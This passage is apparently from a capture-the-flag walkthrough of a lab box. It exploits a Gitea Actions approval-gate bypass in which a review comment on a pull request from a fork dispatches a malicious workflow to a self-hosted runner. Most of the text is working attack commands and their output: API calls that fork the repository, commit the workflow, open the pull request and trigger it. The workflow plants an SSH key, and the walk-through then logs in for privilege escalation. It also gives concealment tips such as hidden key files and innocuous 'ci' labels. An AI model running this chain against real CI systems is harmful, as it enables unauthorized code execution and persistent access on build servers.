**`-b /tmp/gitea_cookies.txt` is mandatory here.** The repository is private, so an unauthenticated request gets a 404. Gitea deliberately returns "not found" rather than "forbidden" for private content.

**Result:**

```yaml
# TODO : Add Tests & Deployment
name: CI
on: [push, pull_request]
jobs:
  ci:
    runs-on: ubuntu
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: npm }
      - run: npm ci
      - run: npm test
      - run: npm run build
```

Twelve lines, and the answer to my question is on line three. Let me go through it properly.

```yaml
# TODO : Add Tests & Deployment
```

A comment — `#` means YAML ignores it. But read it as an attacker: **somebody set this pipeline up, meant to finish it, and never came back.** Two months untouched, per the commit date. Unfinished infrastructure in a live environment is exactly where weaknesses survive, because nobody is reviewing what they consider a work in progress.

```yaml
name: CI
```

A label for the display. Cosmetic.

```yaml
on: [push, pull_request]
```

**This is the line.** Two events start this build, and the difference between them is the entire box.

**`push`** fires when someone commits code directly to the repository. That requires write access. `push: False` — not you.

**`pull_request`** fires when someone opens a pull request. And here's what you need to internalise: **opening a pull request requires only read access.**

That's not an oversight, it's the _purpose_ of pull requests. A pull request is how an outsider proposes a change to code they can't modify: "here's my version, have a look, merge it if you like it." Open-source development runs on this. A stranger with no rights to a project can submit an improvement, and a maintainer reviews and merges it. If proposing changes required write access, the mechanism would be pointless.

So the set of people who can **cause this build to run** is enormous — anyone who can read the repository — while the set who can **commit to it** is small. Those two groups being different is what you're going to exploit.

```yaml
jobs:
  ci:
    runs-on: ubuntu
```

**`runs-on: ubuntu`** decides where the job executes, and this is the second critical line.

That word is a **label** — a tag matching a runner that has registered itself with the Gitea server, advertising which labels it can service. It is _not_ an instruction to spin up a fresh Ubuntu container. GitHub Actions uses names like `ubuntu-latest` for its own ephemeral cloud machines; a bare label like `ubuntu` here matches the **self-hosted runner** you found at `/opt/gitea-runner` on SRV01.

Which means jobs from this pipeline execute **on SRV01, as `svc-runner`.** Not in a container that gets destroyed. On the machine you're currently sitting on, as a different and more privileged account.

**Say that back to yourself, because it's the shape of the whole attack:** if you can make this pipeline run your commands, you get code execution as `svc-runner` on a box where you already have a shell as `josh`. You're not breaking into a new machine. You're upgrading your account on this one, using the domain controller as the remote control.

```yaml
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: npm }
```

`uses:` pulls in a pre-packaged reusable action. **`actions/checkout@v4` downloads the code being built into the runner's working directory** — for a pull request, that means _your_ submitted code lands on SRV01's filesystem. `setup-node` then installs Node.js 20.

```yaml
      - run: npm ci
      - run: npm test
      - run: npm run build
```

`run:` executes a shell command on the runner. Three of them, and every single one is a place where **repository content becomes executed commands**:

- **`npm ci`** installs dependencies from `package-lock.json` — a file in the repository. It also runs `preinstall`, `install`, and `postinstall` lifecycle hooks from any package it fetches.
- **`npm test`** runs whatever string sits under `"test"` in `package.json`. Not a fixed command. A string from a file in the repository.
- **`npm run build`** the same, for `"build"`.

Nothing in the workflow constrains what those become. **Control the repository contents, control what SRV01 executes.**

### Why CI runners are such valuable targets



A CI runner exists to **fetch code and execute it**. That's its entire function. You cannot harden it out of that, because doing it is the job.

Three things compound the risk in this particular setup.

It's **self-hosted rather than ephemeral.** A cloud runner creates a container per job and destroys it after, so a compromise gets you a sandbox with minutes to live. A self-hosted runner is a persistent process on a real machine with a real filesystem, real network position, and whatever credentials it holds.

It runs as a **dedicated service account.** `svc-runner` exists specifically to run builds, and service accounts routinely hold rights the developers themselves don't — deployment permissions, registry credentials, and in a domain environment, directory privileges. You'll find out exactly what `svc-runner` holds in section 4, and it's the reason this box continues after the user flag.

And the trigger includes **`pull_request`**, which by design accepts submissions from people with no write access.

### The remaining obstacle

Platforms know this attack exists. The standard defence is: **when a workflow run originates from a fork, hold it and require a maintainer to approve it before anything executes.** A human looks at the submitted code and clicks approve.

Nobody is going to approve yours.

So there are two things left to solve. You need a copy of the repository you can actually write to — that's 3.19. And you need the approval gate not to engage — that's 3.21, and it's the actual vulnerability in this box.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.19 Fork the repository to obtain a writable copy

A **fork** is your own complete copy of somebody else's repository, under your own account, with you as the owner.

The mechanism exists so that the read-and-propose model works. To suggest a change to code you can't write to, you need somewhere to _make_ the change first. So you fork it, commit freely to your copy, and then open a pull request pointing at the original: "take these commits from my copy into yours."

**Crucially, forking requires only read access.** If you can see it, you can copy it. That has to be true or the whole contribution model collapses.

And your fork is yours. `admin`, `push`, `pull` — full control. Which is the point: **`push: False` on their repository, but `push: True` on yours, and yours contains the same workflow file.**

**Command:**

```bash
CSRF=$(grep _csrf /tmp/gitea_cookies.txt | awk '{print $7}')

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -H "X-Csrf-Token: $CSRF" \
  -d '{}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('full_name:', d.get('full_name')); print('perms:', d.get('permissions')); print('message:', d.get('message',''))"
```

This is the first request in this phase that **changes something**, and that brings new requirements. Everything before now was reading.

**The first line extracts the CSRF token.** `grep _csrf` finds that line in the cookie jar, and `awk '{print $7}'` prints its seventh whitespace-separated field — the value, exactly as I mapped out when we read the jar format. `$(...)` is **command substitution**: run the command, capture the output, and here assign it to the shell variable `CSRF`.

Then `-H "X-Csrf-Token: $CSRF"` sends it back as a header. Same anti-forgery mechanism you met on the campaign application: the server issues a random token and demands it echoed on state-changing requests, so that a malicious site can't make your browser silently submit actions using your cookies. Read operations don't need it. **Everything from here on does.**

**`-X POST`** sets the HTTP method. GET means "give me"; POST means "here's data, do something." Creating a fork is a creation, so POST.

**`-d '{}'`** is the request body — an empty JSON object. The fork endpoint accepts optional settings, such as forking into an organisation instead of your own account. You want the default, so you send nothing. But you must send _something_, because a POST with no body at all can be rejected outright.

**`/forks`** is the endpoint, and note it hangs off **their** repository path. You're saying "make me a fork of this," so the request goes to the thing being copied. The result appears under your account.

The Python prints three fields: `full_name` (where the fork landed), `perms` (your rights on it), and **`message`** — which is where Gitea puts an error string if something failed. An empty `message` means success. Printing it unconditionally means you'll see the reason immediately if it doesn't work, rather than a bare traceback.

**Result:**

```shell
full_name: darkzero-ext_josh/DarkZero-Campaigns
perms: {'admin': True, 'push': True, 'pull': True}
message:
```

There's the flip:

```
perms: {'admin': True, 'push': True, 'pull': True}
```

Compare to two steps ago — `{'admin': False, 'push': False, 'pull': True}` on the same code. Same files, same workflow, and you've gone from read-only to full control by asking politely.

`full_name: darkzero-ext_josh/DarkZero-Campaigns` confirms it landed under your account, and the empty `message` confirms no error.

##### What you actually gained, and what you didn't

**Gained:** a repository you own outright, containing a complete copy of the private code — including `.gitea/workflows/main.yml` with its `pull_request` trigger and its `runs-on: ubuntu` label. You can commit anything to it. You can add files, rewrite the workflow, change `package.json`. No approval, no review.

**And you gained standing.** You can now open pull requests against `DarkZero/DarkZero-Campaigns`, because you have a branch of your own to propose from.

**Didn't gain:** any write access to their repository. That's still `push: False` and always will be. Nothing you commit to your fork appears in theirs unless a maintainer merges it — and none will.

That's the distinction to keep straight. **You're not trying to get code into their repository. You're trying to get their runner to execute code from yours.** The pull request is the messenger, not the goal.

##### Two things worth noticing

**A private repository was forkable.** Nothing stopped you. It's arguably reasonable — read access implies the ability to make a copy, since you could equally `git clone` it — but it means private code now exists in a second location under a user account rather than organisation control. Real finding for the remediation section.

**No approval intervened at any point.** No maintainer notification, no review. Forking is treated as a read-adjacent operation, which it is, right up until it becomes the first move of an attack.

### The obstacle that's left

You have a writable copy. Now think about what happens if you just edit the workflow in your fork and open a pull request.

The pull request fires the `pull_request` event. Gitea inspects the run, sees the code came **from a fork** rather than the repository itself, and holds the job: _pending maintainer approval_. A human has to look at your submission and click approve before anything executes.

That's the defence, and it's the right one. It exists precisely because `pull_request` accepts submissions from untrusted people. Without it, every public repository with a self-hosted runner would be trivially exploitable by any stranger.

**So the approval gate is the last thing between you and code execution as `svc-runner`.** Everything in the next three steps is aimed at it — and the trick isn't to defeat the check, it's to arrive through a door where Gitea forgets to check at all.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.20 Generate an SSH keypair for runner persistence

**Why this step:** The workflow payload must leave behind durable access rather than a single command's output. An SSH public key appended to `svc-runner`'s `authorized_keys` converts one job execution into an interactive session on a host already reachable.

**Commands:**

```bash
ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
```

**`ssh-keygen`** generates the pair.

**`-t ed25519`** picks the algorithm. Ed25519 is modern elliptic-curve cryptography — fast, secure, and _short_. That last property matters practically: an RSA public key is a wall of base64 several hundred characters long, while an Ed25519 one fits on a single readable line. You're about to embed this key inside a YAML file, and short is much easier to handle.

**`-f /tmp/.runner_key`** is the output path for the private key. The public half is written automatically to the same name with `.pub` appended.

Two deliberate choices in that path. `/tmp` because it's world-writable and josh can definitely write there — his home directory would work too, but `/tmp` is reliable. And the **leading dot** makes it hidden: files starting with `.` don't appear in a plain `ls`, so an administrator glancing at `/tmp` won't see it. Mild, cheap concealment.

**`-N ''`** sets an empty passphrase. Normally you'd protect a private key with one, but a passphrase means an interactive prompt on every use, and that would break scripted access. **Empty is required here**, and it's the norm for automation keys.

**`-C 'ci'`** sets the comment field, which is just a trailing label on the public key line. `ci` blends with build tooling — an administrator reading `authorized_keys` sees something that looks like it belongs.

```bash
cat /tmp/.runner_key.pub
```

Prints the public half. **This is the payload's deliverable** — the exact string your workflow will append to `svc-runner`'s `authorized_keys`. You'll copy it into the YAML in the next step.

##### Why generate it here rather than on Kali

Because both ends of the eventual connection are on SRV01. The runner that plants the key is here; the sshd you'll connect to is here; and the private key needs to be wherever you're initiating the SSH connection from, which is also here.

Generate it on Kali and you'd have to transfer the private key over, on a box where you have no easy file transfer and no internet egress. **Generate it where it's used.** No transfer, no problem.

**Result:**

```shell
josh@SRV01:~$ ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/.runner_key
Your public key has been saved in /tmp/.runner_key.pub
The key fingerprint is:
SHA256:cPuvkKA76lTGe+mcMRmQhXBHAlxYjv+u3o5Qs7ljkbY ci

josh@SRV01:~$ cat /tmp/.runner_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4JeeNtVvz6vDoebjRpOSb21QjhLXQ0ZIiuFXprFckD ci
```

Keypair generated.

##### What the payload has to do

You now know the deliverable. So the workflow needs to:

**Create the directory.** `/home/svc-runner/.ssh` may not exist. If sshd can't find the folder it can't find the file.

**Append the key** to `authorized_keys` inside it. Append rather than overwrite — if `svc-runner` has legitimate keys, destroying them might break something and draw attention.

**Fix the permissions.** This is the step people forget and then spend twenty minutes debugging. **sshd refuses to honour an `authorized_keys` file that is group- or world-writable**, silently, because a file others can write to is a file where others can add their own keys. Get this wrong and your key is in place, correct, and completely ignored.

**Prove who ran it**, with `id`. You believe the runner executes as `svc-runner`, but you've inferred that from a directory owner and a hidden process. Confirm it.

**And grab the flag** while you're there, since the job log will show you the output anyway.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.21 Author the malicious workflow

**Why this step:** The fork is writable, but a workflow matching the upstream `on: [push, pull_request]` trigger would be held for maintainer approval when raised as a PR from a fork. A different trigger — `pull_request_review_comment` — causes Gitea 1.25's notifier to omit the PR context, preventing fork detection and bypassing the approval gate entirely while still dispatching to the upstream runner.

**Command:**

```bash
cat > /tmp/foothold.yml << 'EOF'
name: foothold
on:
  pull_request_review_comment:
    types: [created]
jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDySyxPTlJLXnWpd2I19ktZcMnMSWaKqlZunaBHEq2A6 ci' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          id
          cat /home/svc-runner/user.txt
EOF
```

**Result:**

```yaml
name: foothold
on:
  pull_request_review_comment:
    types: [created]
jobs:
  foothold:
    runs-on: ubuntu
    steps:
      - run: |
          install -d -m 700 /home/svc-runner/.ssh
          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4JeeNtVvz6vDoebjRpOSb21QjhLXQ0ZIiuFXprFckD ci' >> /home/svc-runner/.ssh/authorized_keys
          chmod 600 /home/svc-runner/.ssh/authorized_keys
          id
          cat /home/svc-runner/user.txt
```

**I've substituted your public key** from the previous step. Use it as written above, not the version in the writeup.

##### The heredoc, and why the quotes matter

`cat > file << 'EOF'` is a **heredoc** — a way to write a multi-line block into a file from the shell. Everything between that line and the closing `EOF` becomes the file's contents.

**The single quotes around `'EOF'` are not optional and this is the one place you can silently ruin the payload.**

Unquoted, bash performs its usual expansions on the heredoc body: `$VAR` becomes a variable's value, backticks execute commands. Quoted, bash writes the text **exactly as typed**.

Your public key contains base64, and base64's alphabet includes characters bash treats as special. If bash expanded the body, parts of your key could be substituted or deleted, and you'd write a subtly corrupted key. The file would look fine at a glance. The SSH login would fail. You'd have no idea why.

**Quote the delimiter whenever the body contains anything you don't want interpreted.**

##### The workflow structure

`on: pull_request_review_comment` with `types: [created]` is the bypass. The `types` filter restricts it to newly created comments rather than edits or deletions — without it, editing a comment would fire another run, which is unnecessary noise.

`runs-on: ubuntu` **must match the label the runner registered with**, which you read off `main.yml`. A label no runner advertises means the job queues forever with nothing to pick it up.

The `run: |` block — that pipe character introduces a multi-line string in YAML, so everything indented beneath it is one shell script.

##### The five payload commands

**`install -d -m 700 /home/svc-runner/.ssh`** creates the directory with mode 700 (owner-only access) in a single operation. You could use `mkdir -p` then `chmod`, but `install` does both atomically, closing the brief window where the directory exists with default permissions.

**`echo '...' >> .../authorized_keys`** appends your key. **`>>` appends, `>` overwrites** — get that wrong and you destroy any existing keys. Single quotes around the key stop the shell touching it.

**`chmod 600 .../authorized_keys`** makes it readable and writable by the owner only. **The step people skip.** sshd silently ignores an `authorized_keys` file that group or others can write to.

**`id`** prints the current user, groups, and numeric IDs. This is your confirmation that the runner really executes as `svc-runner` — inferred until now. And its output will contain something you're not expecting.

**`cat /home/svc-runner/user.txt`** reads the flag. The job log captures stdout, so it comes back to you in the run output.

<div align="center"> <br> <br> </div>

##### Why `pull_request_review_comment` bypasses the approval gate

Gitea protects against malicious pull requests from forks by requiring maintainer approval before running workflows on untrusted code. The protection works by inspecting the event context: if a workflow run originates from a fork, flag it for approval.

That inspection depends on the event object carrying pull request context — specifically, a field indicating which repository the PR head comes from. When the notifier for `pull_request_review_comment` constructs its event object in Gitea 1.25, it omits that field. No PR context means no fork detection. No fork detection means no approval gate. The run is queued as if it came from the repository itself and dispatched immediately to the runner.

The runner itself cannot distinguish a legitimate job from this one — it receives a signed dispatch from the Gitea instance it trusts and executes it. The failure is entirely in the gate logic, not in the runner.

This is CVE-2026-22555, a logic flaw in the workflow dispatch path rather than a memory corruption or injection issue. It requires only: read access to a repository with Actions enabled, the ability to fork, and a self-hosted runner. All three are present here.

**Next:** Upload the workflow to the fork via the Gitea contents API.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.22 Upload the workflow to the fork

##### Why this step exists at all

Your workflow is a file in `/tmp` on SRV01. Gitea has never heard of it.

Two things have to become true before it can ever fire.

**Gitea has to know the workflow exists.** Actions works by scanning a repository's `.gitea/workflows/` directory and registering every workflow it finds along with its trigger conditions. A file that isn't committed to a repository is not in that directory, so no trigger is registered and no event can ever match it.

**And the file has to be present on the pull request's head commit.** When the review-comment event fires, Gitea looks at the code the pull request is proposing. Your workflow must be part of that code.

Committing to your fork's `main` branch satisfies both at once, because the pull request you open in the next step will use that branch as its source.

##### Normally you'd use git — here you won't

The obvious way to commit a file is git itself: clone the repository, copy the file in, `git add`, `git commit`, `git push`. That's how anybody would do this in normal work.

You're going to use the API instead, and it's worth understanding why so you know when each approach applies.

Cloning means downloading the whole repository — every file, every commit in its history — to disk on SRV01. Then configuring git with an identity, dealing with how it authenticates over HTTP against a Kerberos-protected server, and pushing the result. It's several steps, each with room for failure, and it leaves a full copy of a private codebase sitting in `/tmp` where an administrator might notice it.

**Gitea's contents API creates a commit in one HTTP request.** You already hold an authenticated session and a CSRF token. Nothing lands on disk. One request, one commit.

The general lesson: **when a platform offers an API, prefer it for surgical changes.** Git is for working with code. The API is for making a specific change and getting out.

**Command:**

```bash
B64=$(base64 -w0 /tmp/foothold.yml)

curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d "{\"content\":\"$B64\",\"message\":\"ci\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Ffoothold.yml" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('content',{}).get('name',''), d.get('message',''))"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`base64 -w0`|Encode the file with no line wrapping|The API requires base64; `-w0` keeps it on one line|
|`-X POST` to `/contents/<path>`|Create a new file at that path|Commit a file to the repository|
|`\"content\":\"$B64\"`|The file body, base64-encoded|The workflow itself|
|`\"message\":\"ci\"`|Commit message|Innocuous label matching normal build commits|
|`.gitea%2Fworkflows%2Ffoothold.yml`|Percent-encoded path separators|`%2F` is `/`; encoding prevents the API from splitting the URL into path segments|
|`darkzero-ext_josh/DarkZero-Campaigns`|The fork, not the upstream repository|Where write access exists|

**Result:**

```
foothold.yml
```

An empty `message` field indicates no error; the file was created successfully.

**What this gives you:** The bypass workflow committed to a branch that can be used as a pull request head.

**Key findings:**

- **`.gitea/workflows/foothold.yml` committed to `darkzero-ext_josh/DarkZero-Campaigns`.** The fork now carries both the original `main.yml` and the malicious `foothold.yml`.
- The upload targets the fork exclusively. No write to the upstream repository was attempted or required — the entire attack operates from within josh's own namespace.
- Path separators must be percent-encoded as `%2F` within the filename portion. Unencoded slashes cause the API to interpret them as URL path components and the request fails.
- The commit message `ci` matches the naming convention of the existing pipeline, avoiding obvious anomalies in the commit log.

**Next:** Open a pull request from the fork to the upstream repository, then post a review comment to trigger the workflow.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.23 Open a pull request from the fork

**Why this step:** The bypass trigger is `pull_request_review_comment`, which requires a pull request to comment on. Open a PR from the fork to the upstream repository to create the object the trigger attaches to.

**Command:**

```bash
PR=$(curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d '{"title":"CI","body":"update","head":"darkzero-ext_josh:main","base":"main"}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls")

PRNUM=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['number'])")
SHA=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['head']['sha'])")
echo "PR=$PRNUM SHA=$SHA"
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`PR=$(...)`|Capture the full JSON response into a variable|Save the reply so it can be parsed without re-issuing the request|
|`"head":"darkzero-ext_josh:main"`|Source branch, in `<owner>:<branch>` form|Take the code from my fork's main branch|
|`"base":"main"`|Target branch on the upstream repository|Propose merging it into their main branch|
|`/repos/DarkZero/DarkZero-Campaigns/pulls`|PR creation endpoint on the **upstream** repository|Open the request against the original repo|
|`PRNUM=...` / `SHA=...`|Extract the PR number and head commit SHA into shell variables|Avoids hand-copying the SHA into the next command|

Opening a pull request against a repository requires only read access. No write permission on the upstream repository is involved.

**Result:**

```
PR=1 SHA=04351e99f44e188b2d38771ff42f648bc1549dc5
```

**What this gives you:** A pull request object that the review-comment trigger can attach to, plus the two identifiers required to post that comment.

**Key findings:**

- **Pull request #1 opened against `DarkZero/DarkZero-Campaigns`** from `darkzero-ext_josh:main`, carrying the malicious workflow file.
- The head commit SHA is required by the review API to associate a comment with a specific revision.
- PR creation succeeded with read-only access to the target repository, as designed. Pull requests exist precisely so that non-collaborators can propose changes.
- No workflow has executed yet. The upstream `main.yml` triggers on `pull_request` and would be queued pending maintainer approval as a fork-originated run. The uploaded `foothold.yml` triggers on `pull_request_review_comment`, which has not yet occurred.

**Next:** Post a review comment on the pull request to fire the `pull_request_review_comment` event and dispatch the workflow to the runner.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.24 Trigger the workflow and capture the user flag

##### What fires the event

Gitea distinguishes between two kinds of commentary on a pull request, and the distinction matters because only one of them fires the event you need.

A plain **issue comment** is just a message in the conversation thread. It fires `issue_comment`.

A **review** is the formal mechanism: a maintainer examines the proposed code and returns a verdict — approve, request changes, or simply comment without a verdict. Comments made as part of that process fire **`pull_request_review_comment`**.

You want the second. So you submit a review with the verdict set to `COMMENT`, meaning "I'm leaving remarks, not approving or blocking."

There's a pleasing irony in that. **The review mechanism — the very thing built so a human can scrutinise untrusted code before it runs — is what dispatches the untrusted code.** And you're triggering it yourself, on your own pull request, as the person who submitted it. No maintainer is involved at any point.

**Command 1 — fire the trigger:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  -X POST -H "Content-Type: application/json" \
  -d "{\"event\":\"COMMENT\",\"body\":\"go\",\"commit_id\":\"$SHA\"}" \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/$PRNUM/reviews" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('id:', d.get('id')); print('state:', d.get('state')); print('message:', d.get('message',''))"
```

**`"event":"COMMENT"`** is the verdict. The alternatives are `APPROVE` and `REQUEST_CHANGES`, both of which would also work but carry meaning you don't want in the record.

**`"body":"go"`** is the comment text. Genuinely arbitrary — the trigger fires on the event, not the content. Any string works.

**`"commit_id":"$SHA"`** anchors the review to your head commit. Required by the API, and it's why you captured the SHA.

**`/pulls/$PRNUM/reviews`** is the review-creation endpoint on their repository. Read access is sufficient — reviewing is something outsiders are meant to be able to do.

The escaped `\"` quotes are the same shell-versus-JSON collision from 3.22, and they're needed here because `$SHA` must expand.

Expect `state: COMMENT` and an empty message. **The moment that request returns, the job has been dispatched.**

**Command 2 — confirm it ran:**

```bash
curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/actions/tasks" \
  | python3 -m json.tool | head -40
```

Lists workflow runs for the repository. **Give it a few seconds** before running — dispatch, checkout, Node setup, and your commands take a moment.

Four fields to read in the output:

- **`"workflow_id"`** — `foothold.yml` is yours. `main.yml` is theirs.
- **`"event"`** — should say `pull_request_review_comment`.
- **`"status"`** — `success` is what you want. `waiting` or `blocked` on the `main.yml` entry is the approval gate doing its job.
- **`"run_number"`** — may be higher than 1 for reasons I'll explain after you see it.

```bash
ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; cat ~/user.txt'
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`"event":"COMMENT"`|Post a review without approving or requesting changes|A plain comment, not a verdict|
|`"body":"go"`|Comment text|Arbitrary; content is irrelevant to the trigger|
|`"commit_id":"$SHA"`|Anchors the review to the PR head commit|Required by the API to know which revision is being reviewed|
|`/pulls/$PRNUM/reviews`|Review-creation endpoint for the pull request|Where review comments are posted|
|`/actions/tasks`|Lists workflow runs for the repository|Check whether the job fired and what happened|
|`ssh -i /tmp/.runner_key`|Authenticate with the generated private key|Use the key the workflow planted|
|`-o StrictHostKeyChecking=no`|Skip host key confirmation prompt|Avoid an interactive prompt on first connection|

**Result:**

```
id: 1
state: COMMENT
message:
```

```json
{
    "workflow_runs": [
        {
            "id": 6,
            "name": "foothold",
            "head_sha": "04351e99f44e188b2d38771ff42f648bc1549dc5",
            "run_number": 7,
            "event": "pull_request_review_comment",
            "display_title": "ci",
            "status": "success",
            "workflow_id": "foothold.yml",
            "url": "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/actions/runs/7",
            "run_started_at": "2026-07-29T05:50:28-07:00"
        }
    ]
}
```

```
uid=780601113(svc-runner) gid=780600513(domain users) groups=780600513(domain users),780601114(servicehandler)
df16ad3e79881c515d6d6245b4293d92
```

**USER FLAG: `df16ad3e79881c515d6d6245b4293d92`**

**What this gives you:** Command execution and persistent SSH access as `svc-runner`, plus the user flag.

**Key findings:**

- **The approval bypass is confirmed.** Workflow runs show `event: pull_request_review_comment` with `status: success` and no pending-approval state. A fork-originated workflow executed on the upstream repository's runner without maintainer review.
- **SSH access as `svc-runner` established** using the key planted by the payload. Access is persistent and survives runner restarts.
- **`svc-runner` is a domain account, not a local one.** UID `780601113` and GID `780600513` fall in the SSSD ID-mapping range for domain principals; GID 780600513 corresponds to the well-known `Domain Users` RID 513.
- **Membership in a non-default group: `servicehandler` (GID 780601114).** This group does not exist in a default Active Directory installation and was created deliberately. Custom groups are typically created to delegate specific rights, making this the most promising lead for privilege escalation.
- Each review comment fires an independent workflow run. Repeated comments produced runs 5, 6, and 7, all successful — the bypass is repeatable rather than a one-off race.
- The runner executes jobs directly on SRV01 rather than in an isolated container, so the payload had full filesystem access to `/home/svc-runner`.

**Next:** Establish an interactive session as `svc-runner` and enumerate the directory permissions its group membership confers.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※ <br> </div> <!-- PAGE BREAK --> <div style="page-break-after: always;"></div>

## 4. Privilege Escalation

There is no distinct lateral-movement phase on this box. The foothold obtained in section 3 already sits on the domain-joined host, so escalation proceeds directly from the runner service account to local root, and from there across a forest trust to Domain Administrator in the target forest.

### 4.1 Establish an interactive session as `svc-runner` and inventory directory tooling

**Why this step:** The planted SSH key grants access as a domain account with membership in a non-default group. Obtain an interactive session and determine what tooling is available on the host for querying and modifying Active Directory.

**Commands:**

```bash
ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3
```

```bash
which ldapsearch bloodyAD nxc netexec python3; ls /usr/bin | grep -i ldap
```

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`ssh -i /tmp/.runner_key`|Authenticate with the planted private key|Log in as the runner account|
|`which <tools>`|Report the path of each named binary if present|Check which AD tools are installed|
|`ls /usr/bin \| grep -i ldap`|List all LDAP-related binaries|Find the full OpenLDAP client suite|

**Result:**

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)
Last login: Wed Jul 29 12:55:25 2026 from 172.16.20.3
svc-runner@SRV01:~$
```

```
/usr/bin/ldapsearch
/usr/bin/python3
ldapadd
ldapcompare
ldapdelete
ldapexop
ldapmodify
ldapmodrdn
ldappasswd
ldapsearch
ldapurl
ldapwhoami
```

**What this gives you:** A stable session as a domain account, with native tooling for both reading and writing to Active Directory.

**Key findings:**

- Interactive SSH session established as `svc-runner` on SRV01. Persistence via `authorized_keys` is confirmed working and does not depend on re-triggering the workflow.
- **The complete OpenLDAP client suite is installed**, including write-capable tools: `ldapadd` (create objects), `ldapmodify` (alter attributes), `ldappasswd` (change passwords), `ldapdelete` (remove objects). Directory modification is possible without transferring any tooling to the host.
- `ldapwhoami` is available for confirming the authenticated identity of an LDAP bind — useful for verifying Kerberos-based binds succeed.
- Neither `bloodyAD` nor `netexec` is present, and the host has no internet egress. All directory work must use the native LDAP utilities.
- `python3` is available for scripting where the LDAP tools are awkward.

**Next:** Determine whether `svc-runner` holds a Kerberos ticket, then enumerate the directory for the permissions granted by the `servicehandler` group.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 4.2 Inspect the runner's configuration and cache

**Why this step:** `svc-runner` holds no Kerberos ticket in its login credential cache and its password is unknown. The runner directory is the only content owned by this account; examine it for stored credentials.

**Commands:**

```bash
cat /opt/gitea-runner/.runner
cat /opt/gitea-runner/config.yaml
find /opt/gitea-runner/.cache -type f 2>/dev/null | head -30
```

**Result:**

```json
{
  "id": 1,
  "uuid": "677d64fa-2cf5-41fd-8bac-74ea03a08074",
  "name": "ubuntu-domain-runner",
  "token": "a54bc89011affc6f93ff0d477f79d3fcfd9d3594",
  "address": "http://gitea.darkzero.ext:3000",
  "labels": [ "ubuntu:host" ],
  "ephemeral": false
}
```

```yaml
runner:
  name: "ubuntu-domain-runner"
  labels:
    - "ubuntu:host"
  capacity: 1
cache:
  enabled: true
  dir: "/opt/gitea-runner/.cache"
```

Cache contents are the unpacked source tree of `actions/setup-node` (`src/setup-node.ts`, `action.yml`, `externals/7zr.exe`, and similar).

**What this gives you:** Confirmation that the runner is persistent, and elimination of two candidate credential sources.

**Key findings:**

- The runner registration token `a54bc89011affc6f93ff0d477f79d3fcfd9d3594` authenticates the agent to Gitea for job polling only. It is not a domain credential and cannot bind to LDAP.
- `"ephemeral": false` confirms the runner is persistent rather than torn down per job, which is why the planted `authorized_keys` entry survives.
- The runner name `ubuntu-domain-runner` explicitly labels this as domain-integrated.
- **Dead end:** the cache directory holds only downloaded action source code. No job workspaces, environment files, or secrets are retained.
- **Dead end:** `/etc/krb5.keytab` is mode `0600` root-owned — the machine account key is unreadable. `sudo -l` prompts for a password that is not held.

**Next:** Locate credentials or a keytab that permits `svc-runner` to authenticate against Active Directory.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

